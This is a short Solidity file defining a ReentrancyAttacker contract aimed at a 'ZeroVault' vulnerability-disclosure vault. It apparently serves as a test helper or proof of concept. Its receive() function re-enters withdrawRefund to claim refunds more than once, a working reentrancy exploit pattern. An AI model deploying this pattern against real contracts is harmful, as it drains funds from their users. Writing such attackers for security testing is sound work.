// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IZeroVault {
    function revealAndClaim(bytes32 merkleRoot, string memory decryptionKey) external;
    function commitVulnerability(bytes32 merkleRoot, bytes32 keyHash, address vendor) external;
    function withdrawRefund() external;
}

contract ReentrancyAttacker {
    IZeroVault public vault;
    bytes32 public targetMerkleRoot;
    string public targetKey;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = IZeroVault(_vault);
    }

    function setTarget(bytes32 _merkleRoot, string memory _key) external {
        targetMerkleRoot = _merkleRoot;
        targetKey = _key;
    }

    function commitAndAttack(bytes32 _merkleRoot, bytes32 _keyHash, address _vendor) external {
        vault.commitVulnerability(_merkleRoot, _keyHash, _vendor);
    }

    function attack() external {
        vault.revealAndClaim(targetMerkleRoot, targetKey);
        vault.withdrawRefund();
    }

    receive() external payable {
        if (attackCount < 2) {
            attackCount++;
            vault.withdrawRefund();
        }
    }
}
